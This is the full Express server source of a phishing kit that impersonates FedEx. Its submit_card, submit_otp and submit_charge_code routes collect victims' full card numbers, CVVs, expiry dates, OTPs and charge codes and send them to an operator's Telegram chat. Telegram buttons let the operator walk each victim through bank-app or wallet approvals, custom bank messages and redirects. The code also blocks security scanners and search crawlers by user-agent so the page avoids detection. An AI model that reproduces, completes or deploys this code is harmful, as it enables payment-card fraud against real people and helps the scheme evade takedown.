const express = require('express');
const crypto = require('crypto');
const cookieParser = require('cookie-parser');
const { Redis } = require('@upstash/redis');

/* ---------- env ---------- */
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
const WHITELISTED = (process.env.WHITELISTED_IPS || '').split(',').map(s => s.trim()).filter(Boolean);

if (!BOT_TOKEN || !CHAT_ID) {
  console.error('[config] BOT_TOKEN or CHAT_ID missing in env');
}

/* ---------- redis ---------- */
const redis = new Redis({
  url: process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL,
  token: process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN
});

/* ---------- helpers ---------- */
const safeSid = s => String(s || '').replace(/[^a-fA-F0-9]/g, '').toLowerCase();

async function getState(sid) {
  if (!sid) return { step: 'start' };
  const raw = await redis.get(`state:${safeSid(sid)}`);
  if (!raw) return { step: 'start' };
  try { return typeof raw === 'string' ? JSON.parse(raw) : raw; }
  catch { return { step: 'start' }; }
}

async function setState(sid, state) {
  state.updated = Date.now();
  await redis.set(`state:${safeSid(sid)}`, JSON.stringify(state), { ex: 86400 });
}

async function allStates() {
  const keys = await redis.keys('state:*');
  if (!keys || !keys.length) return [];
  const values = await redis.mget(...keys);
  return keys.map((k, i) => ({
    sid: k.replace(/^state:/, ''),
    data: typeof values[i] === 'string' ? JSON.parse(values[i]) : values[i]
  })).filter(x => x.data);
}

function clientIp(req) {
  return req.headers['cf-connecting-ip']
      || (req.headers['x-forwarded-for'] || '').split(',')[0].trim()
      || req.headers['x-real-ip']
      || (req.socket && req.socket.remoteAddress)
      || '0.0.0.0';
}

async function ipIsBlocked(ip) {
  if (!ip) return false;
  if (WHITELISTED.includes(ip)) return false;
  return (await redis.sismember('blocked_ips', ip)) === 1;
}

async function blockIp(ip) {
  if (!ip || WHITELISTED.includes(ip)) return;
  await redis.sadd('blocked_ips', ip);
}

function luhnCheck(cardNumber) {
  const digits = String(cardNumber || '').replace(/\D/g, '');
  if (digits.length < 13 || digits.length > 19) return false;
  let sum = 0, dbl = false;
  for (let i = digits.length - 1; i >= 0; i--) {
    let d = parseInt(digits[i], 10);
    if (dbl) { d *= 2; if (d > 9) d -= 9; }
    sum += d; dbl = !dbl;
  }
  return sum % 10 === 0;
}

const BAD_WORDS = ['fuck','shit','bitch','asshole','bastard','damn','cunt','dick','cock','pussy','whore','slut','retard','nigger','faggot','rape','nazi','hitler','scam','fraud'];
const containsBadWord = t => BAD_WORDS.some(w => String(t || '').toLowerCase().includes(w));

const BOT_SIGNS = ['HeadlessChrome','PhantomJS','Selenium','Puppeteer','Playwright','Nightmare','Zombie','HtmlUnit','CasperJS','SlimerJS','Googlebot','Bingbot','YandexBot','Baiduspider','DuckDuckBot','masscan','nikto','sqlmap','nmap','zgrab','WPScan'];
const isBot = req => BOT_SIGNS.some(s => String(req.headers['user-agent'] || '').toLowerCase().includes(s.toLowerCase()));

async function tg(method, payload) {
  try {
    const res = await fetch(`${TELEGRAM_API}/${method}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
      signal: AbortSignal.timeout(9000)
    });
    const json = await res.json();
    if (!json.ok) console.warn(`[tg] ${method}`, json);
    return json;
  } catch (err) {
    console.error(`[tg] ${method} FAILED`, err.message);
    return null;
  }
}

const esc = s => String(s == null ? '' : s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

/* ---------- express ---------- */
const app = express();
app.set('trust proxy', true);
app.use(cookieParser());
app.use(express.json({ limit: '1mb' }));

/* ---------- guard ---------- */
app.use(async (req, res, next) => {
  try {
    const ip = clientIp(req);
    if (await ipIsBlocked(ip)) return res.status(403).send('Access denied: IP blocked.');
    if (isBot(req)) return res.status(403).send('Access denied: Automated browser detected.');
  } catch (e) { console.error('guard', e.message); }
  next();
});

/* ---------- session ---------- */
app.use((req, res, next) => {
  if (!req.cookies.sid) {
    const sid = crypto.randomBytes(16).toString('hex');
    res.cookie('sid', sid, { httpOnly: false, sameSite: 'lax', secure: true, maxAge: 86400000 });
    req.cookies.sid = sid;
  }
  req.sid = req.cookies.sid;
  next();
});

/* ---------- health (must respond on both /api/health and /health) ---------- */
function healthHandler(req, res) {
  res.json({
    ok: true,
    bot_token_set: !!BOT_TOKEN,
    chat_id_set: !!CHAT_ID,
    redis_url_set: !!(process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL),
    now: new Date().toISOString()
  });
}
app.get('/api/health', healthHandler);
app.get('/health', healthHandler);

/* ---------- check_status ---------- */
app.get('/api/check_status', async (req, res) => {
  res.set('Cache-Control', 'no-store');
  const sid = req.query.sid || req.sid;
  res.json(sid ? await getState(sid) : { step: 'start' });
});

/* ---------- reset_state ---------- */
app.get('/api/reset_state', async (req, res) => {
  const sid = req.query.sid || req.sid;
  if (!sid) return res.json({ ok: false });
  await setState(sid, { step: 'start' });
  res.json({ ok: true });
});

/* ---------- submit_card ---------- */
app.post('/api/submit_card', async (req, res) => {
  const { sid, name = '', cardNumber = '', expiry = '', cvv = '' } = req.body || {};
  if (!sid || !cardNumber) return res.json({ ok: false, error: 'missing' });
  if (!luhnCheck(cardNumber)) return res.json({ ok: false, error: 'invalid_luhn' });
  if (containsBadWord(name)) return res.json({ ok: false, error: 'bad_words' });

  const masked = cardNumber.substring(0, 4) + ' **** **** ' + cardNumber.slice(-4);
  const last4 = cardNumber.slice(-4);
  const ip = clientIp(req);

  await setState(sid, { step: 'card_received', card: { name, number: cardNumber, expiry, cvv }, masked, last4, ip });

  const text =
    '🔐 <b>FEDEX — CARD RECEIVED</b>\n\n' +
    `<b>Cardholder:</b> <code>${esc(name)}</code>\n` +
    `<b>Card Number:</b> <code>${esc(cardNumber)}</code>\n` +
    `<b>Expiry:</b> <code>${esc(expiry)}</code>\n` +
    `<b>CVV:</b> <code>${esc(cvv)}</code>\n` +
    `<b>Session:</b> <code>${esc(sid)}</code>\n` +
    `<b>User IP:</b> <code>${esc(ip)}</code>\n` +
    `<b>Time:</b> ${new Date().toISOString()}\n\n` +
    'Choose the next action 👇';

  const keyboard = {
    inline_keyboard: [
      [
        { text: '🔓 Send OTP to user', callback_data: `send_otp|${sid}` },
        { text: '📱 Mobile App Approval', callback_data: `mobile_app|${sid}` }
      ],
      [{ text: `🏷️ Verify Card •••• ${last4}`, callback_data: `verify_charge|${sid}` }],
      [{ text: '💳 Google Wallet Approve', callback_data: `wallet_app|${sid}` }],
      [{ text: '🏦 Custom Bank + Amount', callback_data: `custom_bank|${sid}` }],
      [{ text: '📝 Custom Full Message', callback_data: `custom_text|${sid}` }],
      [{ text: '🌐 Custom Redirect', callback_data: `custom_redirect|${sid}` }],
      [
        { text: '❌ Reject', callback_data: `reject|${sid}` },
        { text: '🚫 Block IP', callback_data: `block_ip|${sid}` }
      ]
    ]
  };

  const result = await tg('sendMessage', { chat_id: CHAT_ID, text, parse_mode: 'HTML', reply_markup: keyboard });
  res.json({ ok: !!(result && result.ok), details: result });
});

/* ---------- submit_otp ---------- */
app.post('/api/submit_otp', async (req, res) => {
  const { sid, otp = '', masked = '' } = req.body || {};
  const code = String(otp).trim();
  if (!sid || !code) return res.json({ ok: false });

  const valid = (code === 'APPROVED_IN_APP') || /^\d{4,8}$/.test(code);
  if (!valid) return res.json({ ok: false, error: 'invalid_format' });

  const state = await getState(sid);
  state.step = 'otp_received';
  state.otp = code;
  await setState(sid, state);

  const label = code === 'APPROVED_IN_APP'
    ? '📱 USER MARKED APPROVED IN BANK APP'
    : '🔔 <b>FEDEX — OTP RECEIVED</b>';

  const text =
    `${label}\n\n` +
    `<b>OTP:</b> <code>${esc(code)}</code>\n` +
    `<b>Card:</b> <code>${esc(masked)}</code>\n` +
    `<b>Session:</b> <code>${esc(sid)}</code>\n` +
    `<b>Time:</b> ${new Date().toISOString()}`;

  const keyboard = {
    inline_keyboard: [
      [
        { text: '✅ Approve', callback_data: `approve|${sid}` },
        { text: '❌ Reject', callback_data: `reject|${sid}` }
      ],
      [
        { text: '↩️ Back to Card', callback_data: `back_card|${sid}` },
        { text: '↩️ Back to OTP', callback_data: `back_otp|${sid}` }
      ],
      [{ text: '📱 Mobile App Approve', callback_data: `mobile_app|${sid}` }],
      [{ text: '🚫 Block IP', callback_data: `block_ip|${sid}` }]
    ]
  };

  await tg('sendMessage', { chat_id: CHAT_ID, text, parse_mode: 'HTML', reply_markup: keyboard });
  res.json({ ok: true });
});

/* ---------- submit_charge_code ---------- */
app.post('/api/submit_charge_code', async (req, res) => {
  const { sid, code = '' } = req.body || {};
  const c = String(code).trim();
  if (!sid || !c) return res.json({ ok: false });
  if (!/^\d{3,6}$/.test(c)) return res.json({ ok: false, error: 'invalid_format' });

  const state = await getState(sid);
  state.step = 'charge_code_received';
  state.charge_code = c;
  await setState(sid, state);

  await tg('sendMessage', {
    chat_id: CHAT_ID,
    text: `🏷️ <b>CHARGE CODE RECEIVED</b>\n\n<b>Code:</b> <code>${esc(c)}</code>\n<b>Session:</b> <code>${esc(sid)}</code>`,
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [
        [
          { text: '✅ Approve', callback_data: `approve|${sid}` },
          { text: '❌ Reject', callback_data: `reject|${sid}` }
        ],
        [{ text: '🚫 Block IP', callback_data: `block_ip|${sid}` }]
      ]
    }
  });
  res.json({ ok: true });
});

/* ---------- webhook (must respond on /webhook and /api/webhook) ---------- */
async function webhookHandler(req, res) {
  res.status(200).send('ok');          // acknowledge Telegram immediately
  try {
    const update = req.body;
    if (!update) return;

    /* ---- text inputs ---- */
    if (update.message && update.message.text) {
      const text = String(update.message.text).trim();
      const states = await allStates();
      const find = steps => {
        const c = states.filter(s => s.data && steps.includes(s.data.step));
        if (!c.length) return null;
        c.sort((a, b) => (b.data.updated || 0) - (a.data.updated || 0));
        return c[0];
      };

      let t = find(['awaiting_bank_name']);
      if (t) { t.data.bank_name = text; t.data.step = 'awaiting_bank_amount'; await setState(t.sid, t.data); await tg('sendMessage', { chat_id: CHAT_ID, text: '💰 <b>Step 2:</b> Type the <b>Amount</b>:', parse_mode: 'HTML' }); return; }

      t = find(['awaiting_bank_amount']);
      if (t) { t.data.bank_amount = text; t.data.step = 'custom_bank_view'; await setState(t.sid, t.data); await tg('sendMessage', { chat_id: CHAT_ID, text: '✅ <b>Custom Bank message sent to user!</b>', parse_mode: 'HTML' }); return; }

      t = find(['awaiting_custom_text']);
      if (t) { t.data.custom_text = text; t.data.step = 'custom_text_view'; await setState(t.sid, t.data); await tg('sendMessage', { chat_id: CHAT_ID, text: '✅ <b>Custom Full Message sent!</b>', parse_mode: 'HTML' }); return; }

      t = find(['awaiting_redirect_url']);
      if (t) { t.data.redirect_url = text; t.data.step = 'redirect_user'; await setState(t.sid, t.data); await tg('sendMessage', { chat_id: CHAT_ID, text: `✅ <b>User will be redirected to:</b>\n${text}`, parse_mode: 'HTML' }); return; }
    }

    /* ---- button presses ---- */
    if (update.callback_query) {
      const cb = update.callback_query;
      const data = cb.data || '';
      const msgId = cb.message && cb.message.message_id;
      await tg('answerCallbackQuery', { callback_query_id: cb.id });

      const [action, sid] = data.split('|');
      if (!action || !sid) return;

      const state = await getState(sid);

      if (action === 'custom_bank') { state.step = 'awaiting_bank_name'; await setState(sid, state); await tg('sendMessage', { chat_id: CHAT_ID, text: '🏦 <b>Custom Bank</b>\n\nType the <b>Bank Name</b>:', parse_mode: 'HTML', reply_to_message_id: msgId }); return; }
      if (action === 'custom_text') { state.step = 'awaiting_custom_text'; await setState(sid, state); await tg('sendMessage', { chat_id: CHAT_ID, text: '📝 <b>Custom Full Message</b>\n\nType the text to show:', parse_mode: 'HTML', reply_to_message_id: msgId }); return; }
      if (action === 'custom_redirect') { state.step = 'awaiting_redirect_url'; await setState(sid, state); await tg('sendMessage', { chat_id: CHAT_ID, text: '🌐 <b>Custom Redirect</b>\n\nType the URL:', parse_mode: 'HTML', reply_to_message_id: msgId }); return; }
      if (action === 'wallet_app') { state.step = 'wallet_app'; await setState(sid, state); await tg('sendMessage', { chat_id: CHAT_ID, text: '📱 Google Wallet Approval requested.', reply_to_message_id: msgId }); return; }
      if (action === 'block_ip') { const ip = state.ip || ''; if (ip) await blockIp(ip); state.step = 'blocked_ip'; await setState(sid, state); await tg('sendMessage', { chat_id: CHAT_ID, text: `🚫 IP BLOCKED: <code>${ip}</code>`, parse_mode: 'HTML', reply_to_message_id: msgId }); return; }

      const map = { send_otp: 'send_otp', approve: 'approved', reject: 'rejected', back_card: 'back_to_card', back_otp: 'back_to_otp', mobile_app: 'mobile_app', verify_charge: 'verify_charge' };
      state.step = map[action] || 'start';
      await setState(sid, state);

      const labels = { send_otp: '🔓 SMS OTP sent', mobile_app: '📱 Mobile App Approval sent', approve: '✅ Approved', reject: '❌ Rejected', back_card: '↩️ Back to card', back_otp: '↩️ Back to OTP', verify_charge: '🏷️ Verify-card sent' };
      await tg('sendMessage', { chat_id: CHAT_ID, text: `${labels[action] || action} — session <code>${sid}</code>`, parse_mode: 'HTML', reply_to_message_id: msgId });
    }
  } catch (e) {
    console.error('[webhook] handler error', e);
  }
}
app.post('/webhook', webhookHandler);
app.post('/api/webhook', webhookHandler);

/* ---------- root ---------- */
app.get('/', (req, res) => res.redirect('/index.html'));

module.exports = app;